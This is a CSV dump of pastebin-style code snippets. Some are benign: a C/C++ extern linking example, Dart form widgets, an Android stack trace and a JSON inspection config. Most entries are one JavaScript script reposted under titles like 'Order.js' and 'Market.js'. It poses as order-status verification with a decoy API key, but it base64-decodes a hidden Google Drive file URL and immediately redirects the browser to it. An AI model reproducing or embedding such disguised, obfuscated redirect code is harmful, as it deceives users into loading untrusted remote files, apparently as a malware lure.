id,title,username,language,date,content
8unjAfjs,Products.js,reflezzzz,JavaScript,Friday 11th of April 2025 04:04:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42367/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H3iK1Zq5,extern__cpp_code_call_c_function,devincpp,C++,Friday 11th of April 2025 03:52:07 AM CDT,"/******************************************************/
// 1.h
#ifdef __cplusplus
extern ""C"" {
#endif

    int func(int a, int b);

#ifdef __cplusplus
}
#endif


/******************************************************/
// 1.c
// #include ""1.h""  // 这个头文件可以不加

int func(int a, int b)
{
    return a * b;
}


/******************************************************/
// main.cpp
#include <stdio.h>
#include ""1.h""

int main()
{
    printf(""result=%d\n"", func(123, 10));

    return 0;
}


/******************************************************/
// Makefile
main:
	gcc -c 1.c
	g++ -c main.cpp
	g++ 1.o main.o -o main

clean:
	rm -rf *.o main"
y49dqtEF,Order.js,reflezzzz,JavaScript,Friday 11th of April 2025 03:48:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43699/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f46mWPMd,extern__c_code_call_cpp_function,devincpp,C++,Friday 11th of April 2025 03:43:33 AM CDT,"/******************************************************/
// 1.h
#ifdef __cplusplus
extern ""C"" {
#endif

    int func(int a, int b);

#ifdef __cplusplus
}
#endif


/******************************************************/
// 1.cpp
#include ""1.h"" // 必须加这个头文件，这样才能编译成C符号！！否则会链接失败

int func(int a, int b)
{
    return a * b;
}


/******************************************************/
// main.c
#include <stdio.h>
#include ""1.h""

int main()
{
    printf(""result=%d\n"", func(123, 10));

    return 0;
}


/******************************************************/
// Makefile
main:
        g++ -c 1.cpp
        gcc -c main.c
        g++ 1.o main.o -o main

clean:
        rm -rf *.o main"
5f91f3bh,Market.js,reflezzzz,JavaScript,Friday 11th of April 2025 03:33:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81048/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ty3SG8V2,Untitled,reflezzzz,JavaScript,Friday 11th of April 2025 03:17:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27099/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
n2gQgN2M,existing harga jual diskon,abimulya_,Dart,Friday 11th of April 2025 03:10:01 AM CDT,"Row(
                              crossAxisAlignment: CrossAxisAlignment.center,
                              mainAxisAlignment: MainAxisAlignment.spaceBetween,
                              children: [
                                Text(
                                  'Harga Jual',
                                  style: context.textTheme.titleSmall!
                                      .copyWith(color: AccurateColor.black50),
                                ),
                                const SpaceComponentWidth(),
                                Flexible(
                                  flex: 3,
                                  child: OneFormComponentNumeric(
                                    formCtr: _sellingPriceCtr,
                                    focusNode: _sellingPriceNode,
                                    isUseOutlineBorder: true,
                                    maxLines: 1,
                                    textInputType:
                                        const TextInputType.numberWithOptions(),
                                    hintText: 'Rp.0',
                                    inputFormatter: [RupiahInputFormatter()],
                                    onChanged: (p0) {
                                      _hitCalculateDetail();
                                      return;
                                    },
                                  ),
                                ),
                                Flexible(
                                  child: GestureDetector(
                                    onTap: () {
                                      context
                                          .read<
                                              ProductStockSalePriceHistoryCubit>()
                                          .getSalePriceHistory(
                                            id: item.itemId!,
                                            customerId:
                                                _customerChoosenData.id!,
                                          );
                                    },
                                    child: Column(
                                      children: [
                                        const SpaceComponentHeight(),
                                        Icon(
                                          Icons.restore,
                                          color: AccurateColor.blueAccurate,
                                          size: 27.r,
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            const SpaceComponentHeight(),
                            IntrinsicHeight(
                              child: Row(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                mainAxisAlignment:
                                    MainAxisAlignment.spaceBetween,
                                children: [
                                  Center(
                                    child: Text(
                                      'Diskon',
                                      style: context.textTheme.titleSmall!,
                                    ),
                                  ),
                                  SpaceComponentWidth(width: 40.w),
                                  Flexible(
                                    flex: 1,
                                    child: OneFormComponentNumeric(
                                      formCtr: _discountPercentCtr,
                                      focusNode: _discountPercentNode,
                                      isUseOutlineBorder: true,
                                      maxLines: 1,
                                      textInputType:
                                          const TextInputType.numberWithOptions(
                                        decimal: true,
                                        signed: true,
                                      ),
                                      hintText: '0%',
                                      inputFormatter: [
                                        PercentageInputFormatter()
                                      ],
                                      onChanged: (_) => int.parse(
                                                _discountPercentCtr.text
                                                    .replaceAll('%', ''),
                                              ) <=
                                              100
                                          ? _hitCalculateDetail()
                                          : null,
                                      validator: (value) {
                                        if (value != null && value.isNotEmpty) {
                                          if (int.parse(
                                                  value.replaceAll('%', '')) >
                                              100) {
                                            return 'Maksimal diskon 100%';
                                          }
                                        }
                                        return null;
                                      },
                                    ),
                                  ),
                                  SpaceComponentWidth(width: 8.w),
                                  Flexible(
                                    flex: 2,
                                    child: OneFormComponentNumeric(
                                      formCtr: _discountRupiahCtr,
                                      focusNode: _discountRupiahNode,
                                      isUseOutlineBorder: true,
                                      maxLines: 1,
                                      textInputType: const TextInputType
                                          .numberWithOptions(),
                                      hintText: 'Rp.0',
                                      inputFormatter: [RupiahInputFormatter()],
                                      onChanged: (_) {
                                        _discountPercentCtr.clear();
                                        _hitCalculateDetail();
                                        return null;
                                      },
                                      validator: (value) {
                                        if (rupiahToDouble(value!) >
                                            rupiahToDouble(_totalPrice.value)) {
                                          return 'Diskon melebihi total';
                                        }
                                        return null;
                                      },
                                    ),
                                  ),
                                ],
                              ),
                            ),"
HkbmYpQQ,Products.js,reflezzzz,JavaScript,Friday 11th of April 2025 03:02:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61934/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rp4kaWwh,2025-04-11T09:49:15.492,powerampache,PHP,Friday 11th of April 2025 02:49:16 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 07:49:15 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744357755470""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744357755465""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
zEqzbrTz,Harga jual diskon,abimulya_,Dart,Friday 11th of April 2025 02:48:52 AM CDT,"Column(
  crossAxisAlignment: CrossAxisAlignment.start,
  mainAxisSize: MainAxisSize.min,
  children: [
    Row(
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [
        SizedBox(
          width: 100.w,
          child: Text(
            'Harga Jual',
            style: context.textTheme.titleSmall!
                .copyWith(
                    color: AccurateColor.black50),
          ),
        ),
        Expanded(
          child: Row(
            children: [
              Expanded(
                flex: 7,
                child: OneFormComponentNumeric(
                  formCtr: _sellingPriceCtr,
                  focusNode: _sellingPriceNode,
                  isUseOutlineBorder: true,
                  maxLines: 1,
                  textInputType: const TextInputType
                      .numberWithOptions(),
                  hintText: 'Rp.0',
                  inputFormatter: [
                    RupiahInputFormatter()
                  ],
                  onChanged: (p0) {
                    _hitCalculateDetail();
                    return;
                  },
                ),
              ),
              SizedBox(width: 8.w),
              Container(
                alignment: Alignment.centerRight,
                child: GestureDetector(
                  onTap: () {
                    context
                        .read<
                            ProductStockSalePriceHistoryCubit>()
                        .getSalePriceHistory(
                          id: item.itemId!,
                          customerId:
                              _customerChoosenData
                                  .id!,
                        );
                  },
                  child: Icon(
                    Icons.restore,
                    color:
                        AccurateColor.blueAccurate,
                    size: 27.r,
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    ),
    SizedBox(height: 4.h),
    Row(
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [
        SizedBox(
          width: 100.w,
          child: Text(
            'Diskon',
            style: context.textTheme.titleSmall!,
          ),
        ),
        Expanded(
          child: Row(
            children: [
              Expanded(
                flex: 1,
                child: OneFormComponentNumeric(
                  formCtr: _discountPercentCtr,
                  focusNode: _discountPercentNode,
                  isUseOutlineBorder: true,
                  maxLines: 1,
                  textInputType: const TextInputType
                      .numberWithOptions(
                    decimal: true,
                    signed: true,
                  ),
                  hintText: '0%',
                  inputFormatter: [
                    PercentageInputFormatter()
                  ],
                  onChanged: (_) => int.parse(
                            _discountPercentCtr.text
                                .replaceAll(
                                    '%', ''),
                          ) <=
                          100
                      ? _hitCalculateDetail()
                      : null,
                  validator: (value) {
                    if (value != null &&
                        value.isNotEmpty) {
                      if (int.parse(
                              value.replaceAll(
                                  '%', '')) >
                          100) {
                        return 'Maksimal diskon 100%';
                      }
                    }
                    return null;
                  },
                ),
              ),
              SizedBox(width: 8.w),
              Expanded(
                flex: 2,
                child: OneFormComponentNumeric(
                  formCtr: _discountRupiahCtr,
                  focusNode: _discountRupiahNode,
                  isUseOutlineBorder: true,
                  maxLines: 1,
                  textInputType: const TextInputType
                      .numberWithOptions(),
                  hintText: 'Rp.0',
                  inputFormatter: [
                    RupiahInputFormatter()
                  ],
                  onChanged: (_) {
                    _discountPercentCtr.clear();
                    _hitCalculateDetail();
                    return null;
                  },
                  validator: (value) {
                    if (rupiahToDouble(value!) >
                        rupiahToDouble(
                            _totalPrice.value)) {
                      return 'Diskon melebihi total';
                    }
                    return null;
                  },
                ),
              ),
            ],
          ),
        ),
      ],
    ),
  ],
)"
ZLEb0CY2,Order.js,reflezzzz,JavaScript,Friday 11th of April 2025 02:46:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12076/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QJ3tsDh6,Market.js,reflezzzz,JavaScript,Friday 11th of April 2025 02:31:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26773/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cGjkbnpe,Sample RTPD setup,nerdschleife,JSON,Friday 11th of April 2025 02:18:37 AM CDT,"{
            ""id"" : ""leftfrontedge"",
            ""label"" : ""Left Front Edge"",
            ""infoImage"" : ""https://d1wrvykic4c0bh.cloudfront.net/assets/instruction-page/van/leftfrontedge.png"",
            ""index"" : NumberInt(1),
            ""mandatory"" : false,
            ""personPostureUrl"" : ""https://d1wrvykic4c0bh.cloudfront.net/assets/overlays/IMPROVEMENTS/Kneelevelv2.svg"",
            ""overlayUrl"" : {
                ""portrait"" : ""https://d1wrvykic4c0bh.cloudfront.net/assets/overlays/vansV2/SWB/leftfrontedge.svg"",
                ""landscape"" : ""https://d1wrvykic4c0bh.cloudfront.net/assets/overlays/vansV2/SWB/leftfrontedge.svg""
            },
            ""excludeBBoxesOfPanels"" : [
                ""leftfender""
            ],
            ""panels"" : [
                ""leftfender""
            ],
            ""imageDataAsUrl"" : """",
            ""closeToZeroThreshold"" : 0.02,
            ""closeToOneThreshold"" : 0.98,
            ""panelsV2"" : [
                {
                    ""panel"" : ""frontbumper"",
                    ""threshold"" : 0.2
                },
                {
                    ""panel"" : ""leftheadlamp"",
                    ""threshold"" : 0.4
                },
                {
                    ""panel"" : ""leftfender"",
                    ""threshold"" : 0.2
                }
            ],
            ""negativeExc"" : [
                {
                    ""panel"" : ""rightfender"",
                    ""threshold"" : 0.3
                },
                {
                    ""panel"" : ""rightfrontdoor"",
                    ""threshold"" : 0.3
                }
            ],
            ""scoreIndex"" : NumberInt(2),
            ""classIndex"" : NumberInt(7),
            ""mlCheckOnCapturedImage"" : true,
            ""modelUrl"" : ""https://d2vj2hjmem6f2u.cloudfront.net/cq-assets/public_models/tfjs_model/detection_model/Van/model.json"",
            ""tfliteModelUrl"" : ""https://d1wrvykic4c0bh.cloudfront.net/assets/public_models/tflite_models/detection_models/yolo/vanmodel_new_fp16_20250228_v2.tflite""
        }"
uL8iGNkS,Untitled,reflezzzz,JavaScript,Friday 11th of April 2025 02:16:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42349/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vzCCzzzS,Products.js,reflezzzz,JavaScript,Friday 11th of April 2025 02:00:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63777/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
maATxywq,Order.js,reflezzzz,JavaScript,Friday 11th of April 2025 01:45:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27653/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3mQcypyY,Market.js,reflezzzz,JavaScript,Friday 11th of April 2025 01:30:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38155/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
